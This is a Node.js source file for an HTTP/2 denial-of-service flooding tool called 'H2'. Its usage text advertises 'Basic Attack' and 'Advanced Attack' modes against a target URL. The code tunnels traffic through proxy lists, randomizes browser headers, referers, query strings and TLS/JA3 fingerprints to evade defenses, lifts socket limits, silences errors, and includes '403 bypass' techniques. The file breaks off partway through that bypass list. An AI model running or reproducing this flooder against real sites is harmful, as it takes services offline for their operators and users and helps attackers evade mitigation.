const crypto = require("crypto");
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const colors = require('colors');
const EXPIRATION_DATE = "2125-12-02"; // Ubah sesuai kebutuhan

function isScriptExpired() {
    const currentDate = new Date();
    const expirationDate = new Date(EXPIRATION_DATE);
    return currentDate > expirationDate;
}

if (isScriptExpired()) {
    console.log(colors.red(`
======================================================
                 H2 - EXPIRED
======================================================
[!] Maaf, script ini sudah kadaluarsa.
======================================================
`));
    process.exit(0); 
}

let statusStats = {};
const workers = {};
let ratelimit = [];
let proxies = [];

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on("SIGHUP", () => 1);
process.on("SIGCHLD", () => 1);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

if (process.argv.length < 7) {
    console.log(colors.cyan(`======================================================`));
    console.log(colors.green(`Usage:`));
    console.log(colors.white(`  node H2 [url] [time] [threads] [rate] [proxy]`));
    console.log(colors.cyan(`\nOptions:`));
    console.log(colors.yellow(`  --debug [true/false]       `) + colors.white(`Enable advanced debugging`));
    console.log(colors.yellow(`  --redirect [true/false]    `) + colors.white(`Enable redirect system`));
    console.log(colors.yellow(`  --ratelimit [true/false]   `) + colors.white(`Enable ratelimit system`));
    console.log(colors.yellow(`  --query [true/false]       `) + colors.white(`Enable random queries`));
    console.log(colors.yellow(`  --end [number]             `) + colors.white(`Stop after X requests`));
    console.log(colors.yellow(`  --stealth [true/false]     `) + colors.white(`Mimic browser behavior`));
    console.log(colors.yellow(`  --adaptive [true/false]    `) + colors.white(`Dynamic strategy adjustment`));
    console.log(colors.cyan(`======================================================`));
    console.log(colors.green(`Examples:\n`));
    console.log(colors.white(`➤ Basic Attack:`));
    console.log(colors.cyan(`    node H2 https://example.com 60 10 64 proxies.txt\n`));
    console.log(colors.white(`➤ Advanced Attack (Debug):`));
    console.log(colors.cyan(`   node H2 https://example.com 120 20 128 proxies.txt --ratelimit true --debug true\n`));
    console.log(colors.cyan(`======================================================`));
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const rate = parseInt(process.argv[5]);
const proxyfile = process.argv[6] || 'proxy.txt';
const parsed = url.parse(target);

function loadProxies() {
    if (proxies.length === 0) {
        const data = fs.readFileSync(proxyfile, 'utf-8');
        proxies = data.toString().replace(/\r/g, '').split('\n').filter(Boolean);
    }
    return proxies;
}

function getOption(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = {
    debug: getOption('--debug') === 'true',
    redirect: getOption('--redirect') === 'true',
    ratelimit: getOption('--ratelimit') === 'true',
    query: getOption('--query') === 'true',
    end: parseInt(getOption('--end')) || null,
    stealth: getOption('--stealth') === 'true',
    adaptive: getOption('--adaptive') === 'true'
};

const langHeader = [
    "en-US,en;q=0.9",
    "id-ID,id;q=0.9",
    "en-GB,en;q=0.9",
    "id-ID,id;q=0.7",
    "en-US,en;q=0.5",
    "id-ID,id;q=0.8",
    "en-US,en;q=0.9",
    "id-ID,id;q=0.5",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.5",
    "id-ID,id;q=0.9",
    "en-US;en;q=0.8",
    "tr-TR,tr;q=0.9",
    "zh-CN,zh;q=0.9",
    "zh-TW,zh;q=0.9",
    "id-ID,id;q=0.9",
    "ja-JP,ja;q=0.9",
    "ko-KR,ko;q=0.9",
    "id-ID,id;q=0.9",
    "th-TH,th;q=0.9",
    "vi-VN,vi;q=0.9",
    "ms-MY,ms;q=0.9",
    "hi-IN,hi;q=0.9",
    "tl-PH,tl;q=0.9",
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
    "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
    "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7",
    "hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7",
    "tl-PH,tl;q=0.9,en-US;q=0.8,en;q=0.7"
];

function randomlangHeader() {
    return langHeader[Math.floor(Math.random() * langHeader.length)];
}

const encodingHeader = [
    'gzip, deflate, br, zstd',
    'gzip, deflate, br',
    'gzip, deflate',
    "gzip;q=1.0, deflate;q=0.6, br;q=0.8",
    "gzip;q=1.0, compress;q=0.5, br;q=0.1",
    "compress, gzip",
    "deflate, gzip",
    "compress",
    "identity"
];

function randomencodingHeader() {
    return encodingHeader[Math.floor(Math.random() * encodingHeader.length)];
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_9 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/120.0.6099.112 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/123.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/121.0.6167.100 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/121.0.6167.100 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/121.0.6167.100 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/121.0.6167.100 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6322.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/126.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.289 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 Edg/112.0.1722.64",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.129 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.129 Safari/537.36 Edg/113.0.1774.35",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.161 Safari/537.36 Edg/121.0.2277.137",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36 OPR/106.0.4998.70",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36 Brave/120.1.63.153",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/6.1.3035.111 Chrome/120.0.6099.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/120.0.6099.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 Edg/123.0.2420.65",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36 OPR/107.0.5045.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.59 Safari/537.36 Brave/123.1.66.103",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 YaBrowser/23.9.4.652 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/13.4.0.1306 Chrome/78.0.3904.108 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/5.3.8.2000 Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) CocCocBrowser/112.0.180 Chrome/106.0.5249.119 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:32.0) Gecko/20100101 Firefox/32.0 PaleMoon/32.4.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 SeaMonkey/2.53.13",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Lunascape/6.15.1.27574 Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Iron/119.0.6000.0 Chrome/119.0.6000.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Comodo_Dragon/118.0.0.0 Chrome/118.0.5993.89 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Epic/105.0.5195.102 Chrome/105.0.5195.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Slimjet/38.0.9.0 Chrome/102.0.5005.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.59 Safari/537.36 Avast/123.0.2277.103",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6167.160 Safari/537.36 OPR/106.0.4998.74",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0 Waterfox/4.1.4",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0 LibreWolf/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) BeakerBrowser/1.2.0 Chrome/96.0.4664.110 Safari/537.36"
];

function randomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

const refererList = [
  "https://www.google.com/",
  "https://news.google.com/",
  "https://mail.google.com/",
  "https://www.youtube.com/",
  "https://chrome.google.com/webstore/",
  "https://calendar.google.com/",
  "https://translate.google.com/",
  "https://drive.google.com/",
  "https://maps.google.com/",
  "https://play.google.com/",
  "https://www.mozilla.org/",
  "https://support.mozilla.org/",
  "https://addons.mozilla.org/",
  "https://developer.mozilla.org/",
  "https://blog.mozilla.org/",
  "https://hacks.mozilla.org/",
  "https://monitor.firefox.com/",
  "https://lockwise.firefox.com/",
  "https://relay.firefox.com/",
  "https://accounts.firefox.com/",
  "https://www.apple.com/",
  "https://support.apple.com/",
  "https://www.icloud.com/",
  "https://apps.apple.com/",
  "https://www.macrumors.com/",
  "https://www.apple.com/safari/",
  "https://www.apple.com/ios/",
  "https://developer.apple.com/",
  "https://www.apple.com/newsroom/",
  "https://www.apple.com/retail/",
  "https://www.microsoft.com/",
  "https://www.bing.com/",
  "https://outlook.live.com/",
  "https://www.office.com/",
  "https://support.microsoft.com/",
  "https://account.microsoft.com/",
  "https://www.xbox.com/",
  "https://www.skype.com/",
  "https://www.msn.com/",
  "https://copilot.microsoft.com/",
  "https://cn.bing.com/",
  "https://images.bing.com/",
  "https://www.bing.com/news",
  "https://www.bing.com/videos",
  "https://www.bing.com/maps",
  "https://www.bing.com/shop",
  "https://www.bing.com/search?q=weather",
  "https://www.bing.com/translator",
  "https://duckduckgo.com/",
  "https://www.qwant.com/",
  "https://www.yandex.com/",
  "https://search.yahoo.com/",
  "https://www.ecosia.org/",
  "https://startpage.com/",
  "https://search.brave.com/",
  "https://www.baidu.com/",
  "https://www.naver.com/",
  "https://searx.be/"
];

function randomrefererList() {
    return refererList[Math.floor(Math.random() * refererList.length)];
}

const acceptHeaders = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.5",
  "application/json, text/javascript, */*; q=0.01",
  "application/json, text/plain, */*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.5,application/json;q=0.8",
  "text/html, application/xml;q=0.9, image/webp, *;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.6,application/json;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.6,application/json;q=0.8",
  "application/json, text/plain, */*",
  "application/json, text/javascript, */*; q=0.01",
  "application/json, text/plain, */*",
  "application/json;q=0.9, text/plain;q=0.8, */*;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7,application/json;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json;q=0.9",
  "text/html, application/xhtml+xml, application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.8",
  "application/json, text/plain, */*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7",
  "application/json, text/plain, */*;q=0.7"
];

function randomAccept() {
  return acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
}

function createTLSSocket(parsed, socket) {
    const tlsVersions = ['TLSv1.3', 'TLSv1.2'];
    const selectedVersion = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];

    const cipherSuites = [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256'
    ].join(':');

    const ellipticCurves = [
        'X25519', 
        'P-256', 
        'P-384', 
        'secp521r1'
    ].join(':');

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha256'
    ].join(':');

    const secureOptions = 
        crypto.constants.SSL_OP_NO_SSLv2 | 
        crypto.constants.SSL_OP_NO_SSLv3 | 
        crypto.constants.SSL_OP_NO_TLSv1 | 
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

    const ja3Fingerprint = generateJA3Fingerprint();

    return tls.connect({
        host: parsed.host,
        servername: parsed.host,
        ciphers: cipherSuites,
        sigalgs: signatureAlgorithms,
        curves: ellipticCurves,
        minVersion: selectedVersion,
        maxVersion: 'TLSv1.3',
        ALPNProtocols: ['h2', 'http/1.1', 'http/1.0'],
        socket: socket,
        secure: true,
        requestCert: true,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        sessionTimeout: 0,
        honorCipherOrder: true,
        extensions: {
            ...ja3Fingerprint,
            clientHelloVersion: selectedVersion
        }
    });
}

function generateJA3Fingerprint() {
    const components = {
        sslVersions: ['771', '770', '769'],
        cipherSuites: [
            '4865', '4866', '4867', 
            '49195', '49199', 
            '49171', '49172'
        ],
        extensions: [
            '0', '11', '10', 
            '35', '16', '23', 
            '65281', '43'
        ],
        ellipticCurves: [
            '29', '23', '24', 
            '256', '257'
        ],
        ellipticCurveFormats: ['0', '1']
    };

    const randomSelect = (arr, min, max) => 
        shuffle(arr).slice(0, min + Math.floor(Math.random() * (max - min + 1)));

    return {
        ja3: {
            version: components.sslVersions[0],
            ciphers: randomSelect(components.cipherSuites, 3, 5).join('-'),
            extensions: randomSelect(components.extensions, 4, 7).join('-'),
            curves: randomSelect(components.ellipticCurves, 2, 4).join('-'),
            formats: randomSelect(components.ellipticCurveFormats, 1, 2).join('-')
        },
        fingerprint: crypto.randomBytes(16).toString('hex')
    };
}

function shuffle(array) {
    return array.sort(() => Math.random() - 0.5);
}

function randomQueryParams() {
    const paramTypes = {
        search: ['q', 'query', 'search', 'keyword'],
        pagination: ['page', 'limit', 'offset', 'start'],
        sorting: ['sort', 'order', 'direction'],
        filtering: ['filter', 'category', 'type', 'status']
    };

    const params = [];
    const paramCount = Math.floor(Math.random() * 5) + 1;

    for (let i = 0; i < paramCount; i++) {
        const typeKeys = Object.keys(paramTypes);
        const randomType = paramTypes[typeKeys[Math.floor(Math.random() * typeKeys.length)]];
        const key = randomType[Math.floor(Math.random() * randomType.length)];
        
        const valueGenerators = {
            string: () => randomString(5, 10),
            number: () => Math.floor(Math.random() * 1000),
            boolean: () => Math.random() > 0.5,
            complex: () => {
                const complexTypes = ['uuid', 'timestamp', 'base64'];
                const type = complexTypes[Math.floor(Math.random() * complexTypes.length)];
                
                switch(type) {
                    case 'uuid':
                        return crypto.randomUUID();
                    case 'timestamp':
                        return Date.now();
                    case 'base64':
                        return crypto.randomBytes(8).toString('base64');
                }
            }
        };

        const valueType = Object.keys(valueGenerators)[Math.floor(Math.random() * Object.keys(valueGenerators).length)];
        const value = valueGenerators[valueType]();

        params.push(`${key}=${encodeURIComponent(value)}`);
    }

    return params.join('&');
}

function randomHeaders() {
    const headerCategories = {
        tracking: [
            'X-Forwarded-For',
            'X-Requested-With',
            'X-Correlation-ID',
            'X-Trace-ID'
        ],
        custom: [
            'X-Custom-Header',
            'X-Application-Key',
            'X-Client-ID',
            'X-Session-Token'
        ],
        performance: [
            'X-Response-Time',
            'X-Cache-Control',
            'X-Rate-Limit-Remaining',
            'X-Proxy-ID'
        ],
        security: [
            'X-Security-Token',
            'X-Origin-IP',
            'X-Authenticated-User',
            'X-Access-Level'
        ]
    };

    const headers = {};
    const headerCount = Math.floor(Math.random() * 4) + 2;

    for (let i = 0; i < headerCount; i++) {
        const categoryKeys = Object.keys(headerCategories);
        const randomCategory = headerCategories[categoryKeys[Math.floor(Math.random() * categoryKeys.length)]];
        
        const headerKey = randomCategory[Math.floor(Math.random() * randomCategory.length)];
        
        const valueGenerators = {
            ipv4: () => `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
            token: () => crypto.randomBytes(16).toString('hex'),
            timestamp: () => new Date().toISOString(),
            randomString: () => randomString(10, 20),
            uuid: () => crypto.randomUUID()
        };

        const valueType = Object.keys(valueGenerators)[Math.floor(Math.random() * Object.keys(valueGenerators).length)];
        const headerValue = valueGenerators[valueType]();

        headers[headerKey] = headerValue;
    }

    return headers;
}

function randomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from(
        crypto.randomBytes(length), 
        x => characters[x % characters.length]
    ).join('');
}

class CookieJar {
    constructor() {
        this.cookies = new Map();
        this.cookieMetadata = new Map();
    }

    setCookie(cookieString, domain) {
        const cookies = cookieString.split(';').map(cookie => cookie.trim());
        const now = Date.now();

        cookies.forEach(cookie => {
            const [nameValue, ...attributes] = cookie.split(';');
            const [name, value] = nameValue.split('=');
            const key = `${domain}:${name.trim()}`;

            const parsedAttributes = this._parseCookieAttributes(attributes);

            this.cookies.set(key, value.trim());
            this.cookieMetadata.set(key, {
                domain: domain,
                path: parsedAttributes.path || '/',
                expires: parsedAttributes.expires ? new Date(parsedAttributes.expires).getTime() : null,
                httpOnly: parsedAttributes.httpOnly || false,
                secure: parsedAttributes.secure || false,
                sameSite: parsedAttributes.sameSite || 'Lax',
                created: now
            });
        });

        this._cleanupExpiredCookies();
    }

    getCookieHeader(domain) {
        const now = Date.now();
        const validCookies = [];

        for (const [key, value] of this.cookies.entries()) {
            if (key.startsWith(`${domain}:`)) {
                const metadata = this.cookieMetadata.get(key);
                
                if (metadata && 
                    (!metadata.expires || metadata.expires > now) &&
                    (!metadata.secure || window.location.protocol === 'https:')) {
                    validCookies.push(`${key.split(':')[1]}=${value}`);
                }
            }
        }

        return validCookies.join('; ');
    }

    _parseCookieAttributes(attributes) {
        const parsedAttributes = {};

        attributes.forEach(attr => {
            const [name, value] = attr.trim().split('=');
            switch (name.toLowerCase()) {
                case 'expires':
                    parsedAttributes.expires = value;
                    break;
                case 'path':
                    parsedAttributes.path = value;
                    break;
                case 'domain':
                    parsedAttributes.domain = value;
                    break;
                case 'httponly':
                    parsedAttributes.httpOnly = true;
                    break;
                case 'secure':
                    parsedAttributes.secure = true;
                    break;
                case 'samesite':
                    parsedAttributes.sameSite = value;
                    break;
            }
        });

        return parsedAttributes;
    }

    _cleanupExpiredCookies() {
        const now = Date.now();
        
        for (const [key, metadata] of this.cookieMetadata.entries()) {
            if (metadata.expires && metadata.expires < now) {
                this.cookies.delete(key);
                this.cookieMetadata.delete(key);
            }
        }
    }

    clearCookies(domain) {
        for (const key of this.cookies.keys()) {
            if (key.startsWith(`${domain}:`)) {
                this.cookies.delete(key);
                this.cookieMetadata.delete(key);
            }
        }
    }

    getCookieCount(domain) {
        return Array.from(this.cookies.keys())
            .filter(key => key.startsWith(`${domain}:`))
            .length;
    }
}

const cookieJar = new CookieJar();

function debugRedirect(info) {
    if (options.redirect) {
        console.log(`[Redirect Debug] ${new Date().toISOString()} - ${info}`);
    }
}

function debugAdaptive(status) {
    if (options.debug && options.adaptive) {
        console.log(`[Adaptive Debug] ${new Date().toISOString()} - Status: ${status}, Rate: ${rate}`);
    }
}

function debugStealth(delay) {
    if (options.debug && options.stealth) {
        console.log(`[Stealth Debug] ${new Date().toISOString()} - Delay: ${delay}ms`);
    }
}

let requestCount = 0;

async function attack() {
    if (options.end && requestCount >= options.end) {
        console.log("Reached the specified number of requests. Stopping.");
        process.exit(0);
    }

    const currentTime = Date.now();
    ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);

    let proxy;
    do {
        proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));

    const agent = new http.Agent({
        keepAlive: true,
        maxFreeSockets: Infinity,
        keepAliveMsecs: Infinity,
        maxSockets: Infinity,
        maxTotalSockets: Infinity
    });

    http.request({
        host: proxy[0],
        agent: agent,
        port: proxy[1],
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        method: 'CONNECT',
        path: parsed.host,
    }).on("connect", async (res, socket) => {
        if (res.statusCode === 200) {
            const ua = randomUserAgent();
            const randomParams = randomQueryParams();
            const additionalHeaders = randomHeaders();

            let headers = {
                ":method": "GET",
                ":path": options.query ? (parsed.pathname + '?=' + randomParams) : parsed.pathname,
                ":authority": parsed.host,
                ":scheme": "https",
                "User-Agent": randomUserAgent(),
                "Accept": randomAccept(),
                "Accept-Encoding": randomencodingHeader(),
                "Accept-Language": randomlangHeader(),
                "upgrade-insecure-requests": "1",
                "cache-control": "no-cache",
                "Pragma": "no-cache",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "sec-fetch-site": "none",
                "Referer": randomrefererList(),
                "Origin": `https://${parsed.host}`,
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": cookieJar.getCookieHeader(parsed.host),
                ...additionalHeaders
            };

            const bypass403Techniques = [
                () => {
                    headers[":path"] = headers[":path"].replace(/^\//, '/index.php?');
                },
                () => {
                    headers[":path"] += `&_=${Date.now()}`;
                },
                () => {
                    headers["User-Agent"] = randomUserAgent();
                },
                () => {
